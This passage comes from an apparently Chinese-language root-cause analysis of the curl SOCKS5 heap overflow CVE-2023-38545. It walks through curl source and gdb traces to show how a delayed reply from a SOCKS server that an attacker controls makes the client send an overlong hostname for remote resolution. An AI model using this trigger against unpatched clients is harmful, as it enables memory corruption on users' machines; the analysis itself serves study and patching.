style="color:#f92672">-></span>http_proxy.host.name :</span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>bits.conn_to_host<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>conn_to_host.name :</span></span><span style="display:flex;"><span> sockindex<span style="color:#f92672">==</span> SECONDARYSOCKET<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>secondaryhostname : conn<span style="color:#f92672">-></span>host.name;</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>remote_port<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>bits.httpproxy<span style="color:#f92672">?</span> (<span style="color:#66d9ef">int</span>)conn<span style="color:#f92672">-></span>http_proxy.port :</span></span><span style="display:flex;"><span> sockindex<span style="color:#f92672">==</span> SECONDARYSOCKET<span style="color:#f92672">?</span> conn<span style="color:#f92672">-></span>secondary_port :</span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>bits.conn_to_port<span style="color:#f92672">?</span> conn<span style="color:#f92672">-></span>conn_to_port :</span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>remote_port;</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>proxy_user<span style="color:#f92672">=</span> conn<span style="color:#f92672">-></span>socks_proxy.user;</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>proxy_password<span style="color:#f92672">=</span> conn<span style="color:#f92672">-></span>socks_proxy.passwd;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#a6e22e">connect_SOCKS</span>(cf, sx, data);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Curl_cftype Curl_cft_socks_proxy<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> <span style="color:#e6db74">"SOCKS-PROXYY"</span>,</span></span><span style="display:flex;"><span>  CF_TYPE_IP_CONNECT,</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>,</span></span><span style="display:flex;"><span>  socks_proxy_cf_destroy,</span></span><span style="display:flex;"><span>  socks_proxy_cf_connect,</span></span><span style="display:flex;"><span>  socks_proxy_cf_close,</span></span><span style="display:flex;"><span>  socks_cf_get_host,</span></span><span style="display:flex;"><span>  socks_cf_get_select_socks,</span></span><span style="display:flex;"><span>  Curl_cf_def_data_pending,</span></span><span style="display:flex;"><span>  Curl_cf_def_send,</span></span><span style="display:flex;"><span>  Curl_cf_def_recv,</span></span><span style="display:flex;"><span>  Curl_cf_def_cntrl,</span></span><span style="display:flex;"><span>  Curl_cf_def_conn_is_alive,</span></span><span style="display:flex;"><span>  Curl_cf_def_conn_keep_alive,</span></span><span style="display:flex;"><span>  Curl_cf_def_query,</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>};</span></span></code></pre></div><p><strong>技术分析和动态调试</strong>
本次修复的函数do_SOCKS5实现了处理SOCKS5连接中的各个状态的代码，这个函数实现了一个状态机，状态机根据在socks连接中的不同状态进行不同操作，第一次调用do_SOCKS5时，socks5_resolve_local被初始化为 false，同时状态机状态为CONNECT_SOCKS_INIT</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">bool</span> socks5_resolve_local<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>    (conn<span style="color:#f92672">-></span>socks_proxy.proxytype<span style="color:#f92672">==</span> CURLPROXY_SOCKS5)<span style="color:#f92672">?</span> TRUE : FALSE;</span></span></code></pre></div><pre tabindex="0"><code>gef➤ p socks5_resolve_local
$5 = 0x0</code></pre><p>函数进入CONNECT_SOCKS_INIT分支，由于传递给curl的主机名超长，大于255，进入if中，socks5_resolve_local被赋值为true，代表此时应该使用本地解析</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>(sx<span style="color:#f92672">-></span>state) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CONNECT_SOCKS_INIT:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(conn<span style="color:#f92672">-></span>bits.httpproxy)</span></span><span style="display:flex;"><span><span style="color:#a6e22e">infof</span>(data,<span style="color:#e6db74">"SOCKS5: connecting to HTTP proxy %s port %d"</span>,</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>hostname, sx<span style="color:#f92672">-></span>remote_port);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>socks5_resolve_local<span style="color:#f92672">&amp;&amp;</span> hostname_len<span style="color:#f92672">></span><span style="color:#ae81ff">255</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">infof</span>(data,<span style="color:#e6db74">"SOCKS5: server resolving disabled for hostnames of "</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"length > 255 [actual len=%zu]"</span>, hostname_len);</span></span><span style="display:flex;"><span> socks5_resolve_local<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>此时调用栈如下：</p><pre tabindex="0"><code>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:socks.c+595 ────
590 infof(data, "SOCKS5: server resolving disabled for hostnames of "
591 "length > 255 [actual len=%zu]", hostname_len);
592 socks5_resolve_local = TRUE;
593 }
594
// auth=0x5
→ 595 if(auth &amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI))
596 infof(data,
597 "warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u",
598 auth);
599 if(!(auth &amp; CURLAUTH_BASIC))
600 /* disable username/password auth */
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "curl", stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
gef➤ p socks5_resolve_local
$6 = 0x1
gef➤ bt
#0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573
#1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067
#2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149
#3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296
#4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201
#5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351
#6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106
#7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742
#8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682
#9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772
#10 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791
#11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479
#12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670
#13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786
#14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274
gef➤</code></pre><p>在这状态下，curl会初始化一些SOCKS请求body并将其发送给socks server，而后将状态转为<code>CONNECT_SOCKS_READ_INIT</code>并跳转到对应代码处。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> idx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> socksreq[idx<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>;<span style="color:#75715e">/* version */</span></span></span><span style="display:flex;"><span> idx<span style="color:#f92672">++</span>;<span style="color:#75715e">/* number of authentication methods */</span></span></span><span style="display:flex;"><span> socksreq[idx<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#75715e">/* no authentication */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(allow_gssapi)</span></span><span style="display:flex;"><span> socksreq[idx<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;<span style="color:#75715e">/* GSS-API */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(sx<span style="color:#f92672">-></span>proxy_user)</span></span><span style="display:flex;"><span> socksreq[idx<span style="color:#f92672">++</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;<span style="color:#75715e">/* username/password */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* write the number of authentication methods */</span></span></span><span style="display:flex;"><span> socksreq[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">char</span>) (idx<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outp<span style="color:#f92672">=</span> socksreq;</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outstanding<span style="color:#f92672">=</span> idx;</span></span><span style="display:flex;"><span> presult<span style="color:#f92672">=</span><span style="color:#a6e22e">socks_state_send</span>(cf, sx, data, CURLPX_SEND_CONNECT,</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sxstate</span>(sx, data, CONNECT_SOCKS_READ);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> CONNECT_SOCKS_READ_INIT;</span></span></code></pre></div><p>在状态<code>CONNECT_SOCKS_READ_INIT</code>中，会赋值结构体成员而后将状态转为<code>CONNECT_SOCKS_READ</code>，curl会尝试从TCP连接中读取数据</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CONNECT_SOCKS_READ_INIT:</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outstanding<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;<span style="color:#75715e">/* expect two bytes */</span></span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outp<span style="color:#f92672">=</span> socksreq;<span style="color:#75715e">/* store it here */</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* FALLTHROUGH */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CONNECT_SOCKS_READ:</span></span><span style="display:flex;"><span> presult<span style="color:#f92672">=</span><span style="color:#a6e22e">socks_state_recv</span>(cf, sx, data, CURLPX_RECV_CONNECT,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"initial SOCKS5 response"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(CURLPX_OK<span style="color:#f92672">!=</span> presult)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> presult;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#a6e22e">if</span>(sx<span style="color:#f92672">-></span>outstanding) {</span></span><span style="display:flex;"><span><span style="color:#75715e">/* remain in reading state */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> CURLPX_OK;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>读取数据时，其调用栈如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#960050;background-color:#1e0010">➤</span> bt</span></span><span style="display:flex;"><span><span style="color:#75715e">#0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 "\005\001", len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 "\005\001", len=0x2, err=0x7fffffffb3a4) at cfilters.c:100</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 "\005\001", len=0x2, err=0x7fffffffb3a4) at cfilters.c:328</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 "initial SOCKS5 response") at socks.c:241</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274</span></span></span></code></pre></div><p>让我们把代码放在一起看，在do_SOCKS5函数中，将<code>sx->outstanding</code>赋值为2，尝试调用<code>socks_state_recv</code>从TCP sock中读取两个字节的数据，经过层层调用最终进入到<code>nw_in_read</code>函数中，调用recv函数从sock中读取数据。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>presult<span style="color:#f92672">=</span><span style="color:#a6e22e">socks_state_recv</span>(cf, sx, data, CURLPX_RECV_CONNECT,</span></span><span style="display:flex;"><span><span style="color:#e6db74">"initial SOCKS5 response"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(CURLPX_OK<span style="color:#f92672">!=</span> presult)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> presult;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#a6e22e">if</span>(sx<span style="color:#f92672">-></span>outstanding) {</span></span><span style="display:flex;"><span><span style="color:#75715e">/* remain in reading state */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> CURLPX_OK;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> CURLproxycode<span style="color:#a6e22e">socks_state_recv</span>(<span style="color:#66d9ef">struct</span> Curl_cfilter<span style="color:#f92672">*</span>cf,</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> nread;</span></span><span style="display:flex;"><span> CURLcode result;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> nread<span style="color:#f92672">=</span><span style="color:#a6e22e">Curl_conn_cf_recv</span>(cf<span style="color:#f92672">-></span>next, data, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)sx<span style="color:#f92672">-></span>outp,</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outstanding,<span style="color:#f92672">&amp;</span>result);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>outstanding<span style="color:#f92672">-=</span> nread;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> CURLPX_OK;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span><span style="color:#a6e22e">Curl_conn_cf_recv</span>(<span style="color:#66d9ef">struct</span> Curl_cfilter<span style="color:#f92672">*</span>cf,<span style="color:#66d9ef">struct</span> Curl_easy<span style="color:#f92672">*</span>data,</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(cf)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> cf<span style="color:#f92672">-></span>cft<span style="color:#f92672">-></span><span style="color:#a6e22e">do_recv</span>(cf, data, buf, len, err);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>err<span style="color:#f92672">=</span> CURLE_RECV_ERROR;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">ssize_t</span><span style="color:#a6e22e">cf_socket_recv</span>(<span style="color:#66d9ef">struct</span> Curl_cfilter<span style="color:#f92672">*</span>cf,<span style="color:#66d9ef">struct</span> Curl_easy<span style="color:#f92672">*</span>data,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">size_t</span> len, CURLcode<span style="color:#f92672">*</span>err)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cf_socket_ctx<span style="color:#f92672">*</span>ctx<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>ctx;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">curl_socket_t</span> fdsave;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> nread;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">*</span>err<span style="color:#f92672">=</span> CURLE_OK;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> fdsave<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>conn<span style="color:#f92672">-></span>sock[cf<span style="color:#f92672">-></span>sockindex];</span></span><span style="display:flex;"><span> cf<span style="color:#f92672">-></span>conn<span style="color:#f92672">-></span>sock[cf<span style="color:#f92672">-></span>sockindex]<span style="color:#f92672">=</span> ctx<span style="color:#f92672">-></span>sock;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> nread<span style="color:#f92672">=</span><span style="color:#a6e22e">nw_in_read</span>(<span style="color:#f92672">&amp;</span>rctx, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)buf, len, err);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> nread;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">ssize_t</span><span style="color:#a6e22e">nw_in_read</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>reader_ctx,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">size_t</span> len,</span></span><span style="display:flex;"><span> CURLcode<span style="color:#f92672">*</span>err)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> reader_ctx<span style="color:#f92672">*</span>rctx<span style="color:#f92672">=</span> reader_ctx;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cf_socket_ctx<span style="color:#f92672">*</span>ctx<span style="color:#f92672">=</span> rctx<span style="color:#f92672">-></span>cf<span style="color:#f92672">-></span>ctx;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> nread;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">*</span>err<span style="color:#f92672">=</span> CURLE_OK;</span></span><span style="display:flex;"><span> nread<span style="color:#f92672">=</span><span style="color:#a6e22e">sread</span>(ctx<span style="color:#f92672">-></span>sock, buf, len);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> nread;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">#define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (RECV_TYPE_ARG2)(y), \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (RECV_TYPE_ARG3)(z), \</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (RECV_TYPE_ARG4)(0))</span></span></span></code></pre></div><p>根据RFC1928，服务器会在客户端发送hello包之后返回，选择通信方法后返回server hello
client hello<img alt="" src="/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/2.png"/>
server hello<img alt="" src="/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/3.png"/></p><p>正常情况下，socks服务器返回server hello之后，socks_state_recv读取了两个字节的数据并通过<code>sx->outstanding -= nread;</code>使得outstanding=0，之后在状态机内会继续处理socks连接。</p><p>但如果攻击者可控socks服务器，并强迫在服务器在client 发送hello之后，过了client 设置的sock timeout在返回数据包的话会怎么样？
recv函数如果在setsockopt设置的超时时间内还没有从TCP连接读取到数据的话，则会返回-1，并且err被设置为CURLE_AGAIN ，在<code>socks_state_recv</code>函数中因为读取到的nread=-1，所以这个函数返回CURLPX_OK。</p><p>返回到状态机中，presult=CURLPX_OK，sx->outstanding=2，do_SOCKS5函数返回CURLPX_OK，因为没读数据，所以在easy.c中会继续循环。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> CURLcode<span style="color:#a6e22e">easy_transfer</span>(<span style="color:#66d9ef">struct</span> Curl_multi<span style="color:#f92672">*</span>multi)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> done<span style="color:#f92672">=</span> FALSE;</span></span><span style="display:flex;"><span> CURLMcode mcode<span style="color:#f92672">=</span> CURLM_OK;</span></span><span style="display:flex;"><span> CURLcode result<span style="color:#f92672">=</span> CURLE_OK;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span>done<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>mcode) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> still_running<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> mcode<span style="color:#f92672">=</span><span style="color:#a6e22e">curl_multi_poll</span>(multi, NULL,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1000</span>, NULL);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>mcode)</span></span><span style="display:flex;"><span> mcode<span style="color:#f92672">=</span><span style="color:#a6e22e">curl_multi_perform</span>(multi,<span style="color:#f92672">&amp;</span>still_running);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* only read 'still_running' if curl_multi_perform() return OK */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>mcode<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>still_running) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> rc;</span></span><span style="display:flex;"><span> CURLMsg<span style="color:#f92672">*</span>msg<span style="color:#f92672">=</span><span style="color:#a6e22e">curl_multi_info_read</span>(multi,<span style="color:#f92672">&amp;</span>rc);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(msg) {</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> msg<span style="color:#f92672">-></span>data.result;</span></span><span style="display:flex;"><span> done<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* Make sure to return some kind of error if there was a multi problem */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(mcode) {</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> (mcode<span style="color:#f92672">==</span> CURLM_OUT_OF_MEMORY)<span style="color:#f92672">?</span> CURLE_OUT_OF_MEMORY :</span></span><span style="display:flex;"><span><span style="color:#75715e">/* The other multi errors should never happen, so return</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> something suitably generic */</span></span></span><span style="display:flex;"><span> CURLE_BAD_FUNCTION_ARGUMENT;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>此时socks服务器返回数据的话，再次进入到do_SOCKS5函数，此时在函数开头socks5_resolve_local=false，进入到状态机中，由于此时状态不再是CONNECT_SOCKS_INIT，所以socks5_resolve_local不会被设置为true，此时在状态CONNECT_REQ_INIT时，状态机会跳转到状态CONNECT_RESOLVE_REMOTE，也就是curl尝试让socks服务器进行DNS解析并请求。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>socksreq<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)data<span style="color:#f92672">-></span>state.buffer;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#66d9ef">size_t</span> hostname_len<span style="color:#f92672">=</span><span style="color:#a6e22e">strlen</span>(sx<span style="color:#f92672">-></span>hostname);</span></span><span style="display:flex;"><span>CONNECT_RESOLVE_REMOTE:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CONNECT_RESOLVE_REMOTE:</span></span><span 